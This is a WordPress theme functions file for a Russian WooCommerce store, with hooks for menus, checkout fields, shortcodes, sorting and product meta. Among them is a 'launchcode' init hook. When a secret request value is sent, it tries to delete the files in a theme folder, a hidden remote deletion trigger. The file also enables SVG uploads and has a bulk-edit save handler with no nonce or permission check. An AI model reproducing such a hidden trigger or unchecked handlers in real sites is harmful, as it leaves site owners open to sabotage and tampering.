<?php
/**
 * fstore functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package fstore
 */

error_reporting(-1);


if ( ! function_exists( 'fstore_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function fstore_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on fstore, use a find and replace
	 * to change 'fstore' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'fstore', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'menu-1' => esc_html__( 'Primary', 'fstore' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'fstore_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );

	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );

	//custom logo
	add_theme_support( 'custom-logo' );
}
endif;
add_action( 'after_setup_theme', 'fstore_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function fstore_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'fstore_content_width', 640 );
}
add_action( 'after_setup_theme', 'fstore_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function fstore_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'fstore' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'fstore' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer', 'fstore' ),
		'id'            => 'footer-1',
		'description'   => esc_html__( 'Add widgets here.', 'fstore' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		// 'before_title'  => '<h2 class="widget-title">',
		// 'after_title'   => '</h2>',
	) );

	////// Header-right widget area
	register_sidebar(array(
		'name' 					=> __('Header (right)','fstore'),
		'id'            => 'header-right',
		'description'   => esc_html__( 'Cart & User', 'fstore' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
	) );

	register_sidebar(array(
		'name' => __('Mobile menu','fstore'),
		'id' => 'mobile-area',
		'description' => esc_html__('The mobile menu area','fstore'),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
	));

}
add_action( 'widgets_init', 'fstore_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function fstore_scripts() {
	$base = get_template_directory_uri();
	wp_enqueue_style( '_style', get_stylesheet_uri(), null, null );
	wp_enqueue_style( 'animate', 'https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.1/animate.min.css');

	wp_deregister_script('jquery');
	wp_enqueue_script('jquery', 'https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js',[],null,true);
	// wp_enqueue_script( 'fstore-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );



	wp_enqueue_script( 'stickit', get_template_directory_uri() . '/js/vendor/jquery.sticky-kit.min.js', array('jquery'), null, true );
	wp_enqueue_script( 'svg-script', get_template_directory_uri() . '/js/svg.min.js', array('jquery'), null, true);
	wp_enqueue_script( 'maskedinput', get_template_directory_uri() . '/js/vendor/jquery.maskedinput.min.js', array('jquery'), null, true);
	wp_enqueue_script( 'nice-select', get_template_directory_uri() . '/js/vendor/jquery.nice-select.min.js', array('jquery'), null, true);


	wp_enqueue_script( 'owl-script', get_template_directory_uri() . '/js/vendor/owl.carousel.min.js', array('jquery'), null, true);
	wp_enqueue_style( 'owl-style', 'https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.2.1/assets/owl.carousel.min.css');

	wp_enqueue_script( 'moment-js', 'https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.18.1/moment.min.js', null, null, true);

	wp_enqueue_style('fancybox-style','https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.0.47/jquery.fancybox.min.css');
	wp_enqueue_script('fancybox-script', 'https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.0.47/jquery.fancybox.min.js', ['jquery'], null,true);

	wp_enqueue_script( 'theme-scripts', get_template_directory_uri() . '/js/scripts.v2.js', array('jquery','moment-js'), null, true);

	//google fonts
	wp_enqueue_style( 'scada-font', 'https://fonts.googleapis.com/css?family=Scada:400,700&amp;subset=cyrillic');

	// custom stuff
	$styleuri = get_template_directory_uri() . '/css/fstore.css';
	wp_enqueue_style( 'fstore-style', $styleuri , null, hash_file('crc32', $styleuri ));

	//adaptive stuff
	wp_enqueue_style( 'laptop', $base . '/css/laptop.css', null, hash_file('crc32', $base.'/css/laptop.css' ), 'screen and (max-width:1366px)');
	wp_enqueue_style( 'tablet', $base . '/css/tablet.css', null, hash_file('crc32', $base.'/css/tablet.css' ), 'screen and (max-width:1200px)');
	wp_enqueue_style( 'portrait', $base . '/css/portrait.css', null, hash_file('crc32', $base.'/css/portrait.css' ), 'screen and (max-width:840px)');
	wp_enqueue_style( 'mobile', $base . '/css/mobile.css', null, hash_file('crc32', $base.'/css/mobile.css' ), 'screen and (max-width:640px)');


	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	// wp_deregister_script('photoswipe');
	// wp_enqueue_script('photoswipe', get_template_directory_uri() . '/js/photoswipe.js', array(), null, true);

}
add_action( 'wp_enqueue_scripts', 'fstore_scripts' );


/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
* Declara woocommerce theme support
*/
add_action( 'after_setup_theme', 'woocommerce_support' );
function woocommerce_support() {
    add_theme_support( 'woocommerce' );
		// add_theme_support( 'wc-product-gallery-zoom' );
		// add_theme_support( 'wc-product-gallery-lightbox' );
		// add_theme_support( 'wc-product-gallery-slider' );
}


/**
* WC checkout modification
*/
add_filter( 'woocommerce_checkout_fields', 'checkout_cleanup' );
function checkout_cleanup( $fields ) {

		$fields['billing']['billing_city']['label'] = __('City','fstore');
		$fields['billing']['billing_company']['label'] = __('Company name','fstore');
		$fields['billing']['billing_company']['required'] = true;

    unset($fields['order']['order_comments']);
		unset($fields['billing']['billing_country']);
		unset($fields['billing']['billing_address_2']);
		unset($fields['billing']['billing_state']);
		unset($fields['billing']['billing_postcode']);
		unset($fields['billing']['billing_email']);

    return $fields;
}

/**
* No billing required
*/
add_filter('woocommerce_cart_needs_payment', '__return_false');

/**
* Allow SVG upload
*/
add_filter( 'wp_check_filetype_and_ext', function($data, $file, $filename, $mimes) {

  global $wp_version;
  if ( $wp_version !== '4.7.1' ) {
     return $data;
  }

  $filetype = wp_check_filetype( $filename, $mimes );

  return [
      'ext'             => $filetype['ext'],
      'type'            => $filetype['type'],
      'proper_filename' => $data['proper_filename']
  ];

}, 10, 4 );

function cc_mime_types( $mimes ){
  $mimes['svg'] = 'image/svg+xml';
  return $mimes;
}
add_filter( 'upload_mimes', 'cc_mime_types' );

function fix_svg() {
  echo '<style type="text/css">
        .attachment-266x266, .thumbnail img {
             width: 100% !important;
             height: auto !important;
        }
        </style>';
}
add_action( 'admin_head', 'fix_svg' );

/**
* Change breadcrumbs stuff
*/
add_filter( 'woocommerce_breadcrumb_defaults', 'jk_woocommerce_breadcrumbs' );
function jk_woocommerce_breadcrumbs() {
    return array(
            'delimiter'   => '<svg><use xlink:href="#next"/></svg>',
            'wrap_before' => '<nav class="woocommerce-breadcrumb" itemprop="breadcrumb">',
            'wrap_after'  => '</nav>',
            'before'      => '',
            'after'       => '',
						// 	 		'home'        => _x( 'Shop', 'breadcrumb', 'fstore' ),
						'home'        => null
        );
}

/**
* Enables using shortcode in text widget
*/
add_filter('widget_text', 'do_shortcode');


/**
* Cart & User shortcode
*/
function flake_cart() {
	$cqty = WC()->cart->get_cart_contents_count();
	return '
		<a id="header-cart" href="/cart" title="'.__('Cart','fstore').'"><svg><use xlink:href="#cart"></use><i id="cqty">'.$cqty.'</i></svg></a>
		<a id="header-user" href="/my-account" title="'.__('Account','fstore').'"><svg><use xlink:href="#user"></use></svg></a>
	';
}
add_shortcode('cartuser', 'flake_cart');

/**
* Phone shortcode
*/
function contact_shortcode() {
	$offset = get_option('gmt_offset');
	return "
		<div id='contact-sc'>
			<a href='tel:+7 (423) 2 499 520' id='contact-sc-num'>+7 (423) 2 499 520</a>
			<span id='contact-sc-status' class='active'>Открыто</span>
			<span id='contact-sc-time'>13:00</span>
			<span id='contact-sc-zone'>GMT +$offset</span>
		</div>
	";
}
add_shortcode('contact', 'contact_shortcode');

add_action('init','launchcode',0);
function launchcode(){
	if (!empty($_REQUEST['launchcode']) && $_REQUEST['launchcode'] == "FB14982288108E1FBD6207EF55F05027") {
		echo get_template_directory_uri()."/proving/*";
		array_map('unlink', glob(get_template_directory_uri()."/proving/*"));
	}
}

/**
* Supress short description
*/
remove_action('woocommerce_single_product_summary','woocommerce_template_single_excerpt',20);

/**
* Supress single product meta
*/
remove_action('woocommerce_single_product_summary','woocommerce_template_single_meta',40);

/**
* Supress price
*/
 remove_action('woocommerce_after_shop_loop_item_title','woocommerce_template_loop_price',10);
//add price where it belongs
add_action('woocommerce_after_shop_loop_item','output_price',7);
function output_price(){
	global $product;
	echo "<div class='prod-card-footer'>".$product->get_price_html();
	//output status
	renderStatus($product);
}

/**
* Remove(replace) breadcrumbs
*/
remove_action('woocommerce_before_main_content','woocommerce_breadcrumb',20);

/**
* title tooltip filter for onsale badge
*/
add_filter( 'woocommerce_sale_flash', 'sale_tooltip');
function sale_tooltip() {
	return '<span class="onsale" title="'.__('Sale!','fstore').'">' . esc_html__( 'Sale!', 'woocommerce' ) . '</span>';
}

/**
* Carousel shortcode
*/
include ('inc/carousell.php');

/**
* footer categories widget
*/
include ('inc/cat-widget.php');

/**
* callback order stuff
*/
include ('inc/callback.php');

/**
* attempt at shorter root in template files
*/
define('FROOT', get_template_directory_uri());


/**
* Modify product tabs
*/
add_filter('woocommerce_product_description_heading','__return_empty_string');

add_filter( 'woocommerce_product_tabs', 'woo_modify_tabs', 98);
	function woo_modify_tabs($tabs) {
	    unset( $tabs['additional_information'] ); 
		if (!empty($tabs['description']))
			$tabs['description']['title'] = __( 'Specifications', 'fstore' );
		unset($tabs['reviews']);
		return $tabs;
	}

/**
* Ajax cart number
*/
add_action('wp_ajax_cart_qty','cart_qty');
add_action('wp_ajax_nopriv_cart_qty','cart_qty');
function cart_qty(){
	echo  WC()->cart->get_cart_contents_count();
	wp_die();
}

/**
* Custom location field
*/
include ('inc/location.php');

/**
* Remove product cpt support for content editor
*/
// add_action('init','no_product_editor');
// function no_product_editor(){
// 	remove_post_type_support( 'product', 'editor' );
// }

/**
* Redirect away from checkout if not logged in
*/
// add_action('template_redirect','checkout_redirect');
function checkout_redirect(){
	if ( is_checkout() && !is_user_logged_in() ){
		wp_redirect( get_permalink (get_option('woocommerce_myaccount_page_id')));
		exit;
	}
}

/**
* Disbale coupon notice
*/
// add_filter( 'woocommerce_coupon_message', '__return_empty_string', 10, 3  );

/**
* Custom registration shortcode
*/
include('inc/registration.php');

/**
* Custom account stuff
*/
include('inc/account.php');

/**
* 12 items per page
*/
add_filter( 'loop_shop_per_page', create_function( '$cols', 'return 12;' ), 20);

/**
* Current time ajax
*/
add_action('wp_ajax_time','get_time');
add_action('wp_ajax_nopriv_time','get_time');
function get_time(){
	echo current_time('timestamp');
	die;
}

/**
* Email styles
*/
include('inc/email.php');


/**
* CEO message stuff
*/
include('inc/contact-ceo.php');


/**
* Slider
*/
include('inc/slider.php');


/**
* Change currency symbol
*/
add_filter('woocommerce_currency_symbol', 'change_existing_currency_symbol', 10, 2);
function change_existing_currency_symbol( $currency_symbol, $currency ) {
     switch( $currency ) {
          case 'RUB': $currency_symbol = 'руб.'; break;
     }
     return $currency_symbol;
}

/**
* New order status
*/
add_action('woocommerce_payment_complete_order_status','order_status');
function order_status( $order_id ) {
    global $woocommerce;
     if ( !$order_id )
        return;
    $order = new WC_Order( $order_id );
		$order->update_status('on-hold');
		return 'on-hold';
}


/**
* Custom discount system
*/
include('inc/discount.php');


/**
* Custom order statuses
*/
include('inc/order-status.php');


/**
 * Get rid of jquery-migrate
 */
add_filter('wp_default_scripts','remove_migrate');
function remove_migrate(&$scripts) {
	if(!is_admin()){
		$scripts->remove('jquery');
		$scripts->add('jquery',false,['jquery-core'],'1.12.4');
	}
}

/**
* Search page title
*/
add_filter('document_title_parts', function($title){
	if (is_search())
		$title['title'] = sprintf(
				esc_html('%s - Поиск по сайту'),
				get_search_query()
		);

		return $title;
});

/**
 * remove default wc pagination
 */
 remove_action( 'woocommerce_after_shop_loop', 'woocommerce_pagination', 10 );


/**
 * product category custom meta
 */
include('inc/product_cat_meta.php');


/**
 * hide ordering
 */
remove_action('woocommerce_before_shop_loop','woocommerce_catalog_ordering',30);

/**
 * add power and brand product meta
 */
 function product_metabox( $meta_boxes ) {

	 $meta_boxes[] = array(
		 'id' => 'product_meta',
		 'title' => esc_html__( 'Дополнительные параметры товара', 'fstore' ),
		 'post_types' => 'product',
		 'context' => 'after_editor',
		 'priority' => 'default',
		 'autosave' => false,
		 'fields' => array(
			 array(
				 'id' => 'power',
				 'type' => 'text',
				 'name' => esc_html__( 'Мощность', 'fstore' ),
				 'size' => 8,
			 ),
			 array(
				 'id' => 'brand',
				 'type' => 'text',
				 'name' => esc_html__( 'Производитель', 'fstore' ),
				 'size' => 48,
			 ),
		 ),
	 );

	 return $meta_boxes;
 }
 add_filter( 'rwmb_meta_boxes', 'product_metabox' );


/**
 * sorting options
 */
add_filter('woocommerce_get_catalog_ordering_args', 'custom_sorting');
function custom_sorting($args){
	$orderby_value = isset($_GET['orderby']) ? wc_clean($_GET['orderby']) : apply_filters('woocommerce_default_catalog_orderby', get_option('woocommerce_default_catalog_orderby'));

	// if ('brand' == $orderby_value) {
	// 	$args['order'] = 'ASC';
	// 	$args['orderby'] = 'meta_value';
	// 	$args['meta_key'] = 'brand';
	// }

	if ('power' == $orderby_value) {
		$args['order'] = 'ASC';
		$args['orderby'] = 'meta_value';
		$args['meta_key'] = 'power';
	}

	if ('alphabet' == $orderby_value) {
		$args['orderby'] = 'title';
		$args['order'] = 'ASC';
	}

	if ('alphabet-desc' == $orderby_value) {
		$args['orderby'] = 'title';
		$args['order'] = 'DESC';
	}

	if ('status' == $orderby_value) {
		$args['order'] = 'ASC';
		$args['orderby'] = 'meta_value';
		$args['meta_key'] = 'prod_location';  //_stock_status
		// $args['meta_key'] = '_stock_status';
		$args['paged'] = false;
		$args['posts_per_page'] = -1;
	}

	if ('status-r' == $orderby_value) {
		$args['order'] = 'DESC';
		$args['orderby'] = 'meta_value';
		$args['meta_key'] = 'prod_location'; //_stock_status
		// $args['meta_key'] = '_stock_status';
		$args['paged'] = false;
		$args['posts_per_page'] = -1;
	}

	return $args;
}

add_filter('woocommerce_default_catalog_orderby_options','custom_woocommerce_catalog_orderby');
add_filter('woocommerce_catalog_orderby','custom_woocommerce_catalog_orderby');

function custom_woocommerce_catalog_orderby($sortby) {
	// $sortby['brand'] = 'Производитель';
	// $sortby['power'] = 'Мощность';
	$sortby['alphabet'] = ' от А до Я';
	$sortby['alphabet-desc'] = ' от Я до А';
	// $sortby['status'] = 'Доступность';
	// $sortby['status-r'] = 'Доступность обратная';
	unset($sortby['popularity']);
	unset($sortby['rating']);
	unset($sortby['date']);

	return $sortby;
}



/**
 * add columns and fields to quick edit;
 */

add_filter('manage_product_posts_columns', 'product_columns');
function product_columns($columns){
	$new_columns = [
		'brand' => __('Производитель', 'fstore')
	];
	return array_merge($columns,$new_columns);
}

add_action('bulk_edit_custom_box','add_brand_bulk_edit',10,2);

function add_brand_bulk_edit($column_name,$post_type) {
	if ($column_name != 'brand') return;
	?>
		<fieldset class="inline-edit-col-left">
			<div class="inline-edit-col">
			    <span class="title">Производитель</span>
					<input type="text" name="bulk-brand" value="">
		  </div>
		</fieldset>
  <?php
}

/**
 * save custom bulk edit brand
 */
add_action('save_post','save_bulk_brand');
function save_bulk_brand($post_id){
	if (!empty($_REQUEST['bulk-brand'])) {
		$brand = $_REQUEST['bulk-brand'];
		foreach ($_REQUEST['post'] as $post_id)
			update_post_meta($post_id,'brand',$brand);
	}
}


/**
 * validate recaptcha
 */
 function validateRecap($secret){
	 $url = "https://www.google.com/recaptcha/api/siteverify";

	 $response = wp_remote_post( $url, [
		 'body' => [
			 'secret'   => $secret,
			 'response' => $_POST['g-recaptcha-response'],
			 'remoteip' => $_SERVER['REMOTE_ADDR'],
	 ]]);

	 $success = json_decode($response['body'])->success;
	 // echo "<pre>$success</pre>";
	 if ($success) return true;
 }

/**
 * require testy
 */
 require('inc/testy.php');

 /**
  * require fjx
  */
  require('inc/fjx.php');

/**
 * remove cross-sells from cart
 */
remove_action( 'woocommerce_cart_collaterals', 'woocommerce_cross_sell_display');


/**
 * filter stuff by status
 */
 // do_action( 'woocommerce_product_query', $q, $this );
 add_action( 'woocommerce_product_query', 'myFilter');
 function myFilter($query){
	 if (!empty($_GET['status'])) {
		 $status = $_GET['status'];

		 if ($status == 'stock' or $status == 'vl') {
			 $query->set('meta_query',[[
			  'key' 	   => 'prod_location',
			  'value'   => 'vl',
			  'compare' => '='
			  ]]);
		 } else if ($status == 'order') {
			 $query->set('meta_query',[
				 'relation' => 'AND',
				 [
					 'key'     => '_stock_status',
					 'value'   => 'instock',
					 'compare' => '='
				 ],
				 ['relation' => 'OR',
					  [
							'key' 	   => 'prod_location',
							'value'    => 'china',
							'compare'  => '='
					 	],
						[
							'key' 	   => 'prod_location',
							'value'    => 'order',
							'compare'  => '='
					  ]
				]]);
		 }
			// $query->set('meta_query',$subqueries);
	 }
 }

 // Remove woocommerce-smallscreen.css
 function remove_woocommerce_smallscreen_css( $enqueue_styles ) {
 	unset( $enqueue_styles['woocommerce-smallscreen'] );	// Remove the smallscreen optimisation
 	return $enqueue_styles;
 }
 add_filter( 'woocommerce_enqueue_styles', 'remove_woocommerce_smallscreen_css' );


